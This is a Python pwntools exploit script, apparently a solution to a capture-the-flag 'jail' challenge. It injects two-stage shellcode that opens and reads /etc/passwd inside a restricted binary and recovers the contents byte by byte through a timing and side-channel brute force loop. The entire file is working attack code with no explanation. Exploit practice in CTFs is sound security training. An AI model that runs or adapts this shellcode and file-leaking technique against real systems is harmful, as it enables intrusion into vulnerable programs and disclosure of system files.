from pwn import *
import time
import string
chars = string.ascii_uppercase + string.ascii_lowercase + string.digits + "{_}"

context.terminal = "tmux splitw -h".split()
context.binary = elf = ELF('jail',0)

idx = 0
flag = ""
while "}" not in flag:
    for c in chars:
        context.log_level = 'error'
        p = elf.process()
        #p = remote('2023.ductf.dev', 30010)
        sc = """
        xor rdi, rdi
        mov rsi, rdx
        mov rdx, 0x100
        xor rax, rax
        syscall
        """
        p.sendlineafter(b"> ", asm(sc))

        sc = shellcraft.pushstr("/etc/passwd")
        sc += shellcraft.openat(-100, "rsp", 0)
        sc += shellcraft.read("rax", "rsp", 0x100)
        sc += "movzx rax, byte ptr [rsp+{}];".format(idx)
        sc += "xor rax, {};".format(ord(c))
        sc += "xor rdi, rdi;"
        sc += "mov rdx, 1;"
        sc += "syscall;"
        p.sendline(cyclic(18) + asm(sc))
        print("trying ->", c, end="\r")
        try:
            p.recv(timeout=0.1)
            p.sendline(b"aoskdoaw")
            flag += c
            print(flag)
            idx += 1
            break
        except Exception as e:
            continue

        p.close()
p.interactive()

